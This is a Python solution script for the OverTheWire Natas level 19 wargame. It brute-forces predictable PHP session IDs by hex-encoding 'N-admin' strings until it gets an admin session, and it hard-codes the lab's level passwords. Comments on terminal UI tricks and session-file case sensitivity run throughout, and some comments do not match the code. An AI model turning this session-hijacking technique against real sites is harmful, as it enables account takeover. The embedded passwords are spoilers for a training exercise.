import requests
import time
import os
from requests.auth import HTTPBasicAuth
import base64
#正常的网站返回的消息一般都没啥区别
#所以更常见的注入是基于时间的
#比如sql就有一个AND SLEEP(2)
#来作为一种"是否找到"的判定
os.system('')

Natas19_psw = 'qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT'
# 1. 建立长连接 Session
s = requests.Session()
s.auth = HTTPBasicAuth('natas19', Natas19_psw)
url = "http://natas19.natas.labs.overthewire.org/index.php"


spinner = ['|', '/', '-', '\\']
spin_idx = 0
modifiedCookie=""

print("\n")  # 额外加一个 \n 腾出两行的空间

for i in range(1, 641):
    data=str(i)+"-admin"
    #modifiedCookie={"PHPSESSID": str(base64.b16encode(data.encode('utf-8')).decode('utf-8'))}
    #base64.b16encode(...) returns a bytes object (e.g. b'312D61646D696E')
    #to clean this, could also use
    clean_cookie_str = data.encode('utf-8').hex() 
    modifiedCookie={"PHPSESSID": clean_cookie_str}

    '''So base64.b16encode(b"1-admin") produces '312D61646D696E'.
        While .hex() produces '312d61646d696e'.
         session files are saved directly onto the Linux server's disk (e.g. /var/lib/php/sessions/sess_312d61646d696e).
        Linux file systems are strictly case-sensitive
    '''

    spin_char = spinner[spin_idx % 4]
    spin_idx += 1
    #directly str(base64.b16encode(data.encode(data.encode()) will be wrapped in
    #"b'xxx'"
    # ================= UI =================
    # \r 回到第一行开头，打印当前猜测，\033[K 清除第一行尾部残留
    # \n 换到第二行，\r 回到第二行开头，打印已确认密码，\033[K 清除第二行尾部残留
    # \033[A 光标上移一行！回到第一行，为下一次循环做准备

    # end="" 不换行，flush=True 强制刷新
    # ===============================================
    # 核心其实就是控制在哪行刷
    #'' or "" are identical in python
    #print(f"\r{spin_char}{modifiedCookie}\033[k", end="", flush=True)
    s.cookies.clear()
    while True:
        try:
                # Set timeout=10 so normal network delay won't crash it,
                # but it allows the 2-second sleep to return properly
            
            #this clear and avoid cookie pollution
            response = s.get(url, cookies=modifiedCookie, timeout=5)
            #print(response.text)
            #print(modifiedCookie)
            break
            
        except requests.exceptions.RequestException:
            # This only triggers if the connection genuinely fails (> 10s drop)
            warn_ui = f"\r[!] Net Error... Retrying {modifiedCookie}\033[K\n\r\033[K\033[A"
            print(warn_ui)
            time.sleep(1)

    if "You are an admin" in response.text:
        print(f"\n\r * FoundAdminSession ID:{i}")
        print(response.text)
        break
    else:
        print(f"\rTesting ID: {i}\033[K", end="", flush=True)
        
            

        #qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT 119
    
        #slOKYGsjlJhaqKliGvrgWAzln0JyrWao 281
            
            
            

# 结束后，打印两个换行符 \n\n，把光标推到 UI 下面，防止终端提示符覆盖
print(f"\n\n[SUCCESS] done")

